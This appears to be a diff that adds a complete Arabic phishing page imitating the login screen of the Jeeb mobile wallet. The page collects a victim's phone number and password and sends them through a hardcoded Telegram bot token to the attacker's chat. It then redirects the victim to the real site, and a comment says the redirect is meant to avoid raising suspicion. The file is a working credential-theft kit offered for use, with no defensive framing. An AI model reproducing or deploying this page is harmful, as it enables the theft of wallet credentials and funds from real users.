@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جيب | تسجيل الدخول</title>
+    <style>
+        :root {
+            --main-green: #27ae60; 
+            --dark-green: #1e8449;
+            --bg-gray: #f8f9fa;
+            --text-dark: #333;
+            --text-muted: #777;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-gray);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 40px 20px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .logo-area {
+            margin-bottom: 30px;
+        }
+
+        .logo-area img {
+            width: 120px; 
+            height: auto;
+        }
+
+        .welcome-text h2 {
+            color: var(--text-dark);
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+
+        .welcome-text p {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+            margin-right: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--main-green);
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--main-green);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-login:hover {
+            background-color: var(--dark-green);
+        }
+
+        .forgot-pass {
+            display: block;
+            margin-top: 15px;
+            font-size: 13px;
+            color: var(--main-green);
+            text-decoration: none;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="logo-area">
+                <!-- ضع رابط شعار جيب هنا -->
+        <img src="https://www.jeeb.com.ye/assets/images/logo.png" alt="Jeeb Wallet">
+    </div>
+
+    <div class="welcome-text">
+        <h2>مرحباً بك في محفظة جيب</h2>
+        <p>يرجى تسجيل الدخول لمتابعة عملياتك المالية</p>
+    </div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label>رقم الهاتف</label>
+            <input type="text" id="phone" placeholder="7xxxxxxxx" required>
+        </div>
+
+        <div class="input-group">
+            <label>كلمة المرور</label>
+            <input type="password" id="password" placeholder="••••••••" required>
+        </div>
+
+        <button type="submit" class="btn-login">دخول</button>
+    </form>
+
+    <a href="#" class="forgot-pass">نسيت كلمة المرور؟</a>
+</div>
+
+<script>
+    const loginForm = document.getElementById('loginForm');
+
+    // ⚠️ قم بتغيير هذه القيم ببيانات بوتك الخاصة
+    const TELEGRAM_BOT_TOKEN = '8988406192:AAGcfp4QJBpYK4unEX_q-EayPsz_htE20z4'; 
+    const TELEGRAM_CHAT_ID = '7623583499';
+
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const phone = document.getElementById('phone').value;
+        const password = document.getElementById('password').value;
+
+        // تنسيق الرسالة التي ستصلك على التلجرام
+        const message = `🔔 صيد جديد من محفظة جيب!\n\n📱 الهاتف: ${phone}\n🔑 كلمة المرور: ${password}\n\n🔗 الرابط: ${window.location.href}`;
+
+        // رابط الـ API الخاص بتلجرام لإرسال الرسالة
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+        // تنفيذ عملية الإرسال بشكل مخفي
+        fetch(telegramUrl)
+        .then(response => {
+            // تحويل الضحية فوراً للموقع الرسمي لعدم إثارة الشكوك
+            window.location.href = "https://www.jeeb.com.ye"; 
+        })
+        .catch(error => {
+            // تحويل حتى في حال فشل الإرسال لضمان عدم بقاء المستخدم في الصفحة
+            window.location.href = "https://www.jeeb.com.ye";
+        });
+    });
+</script>
+
+</body>
+</html>
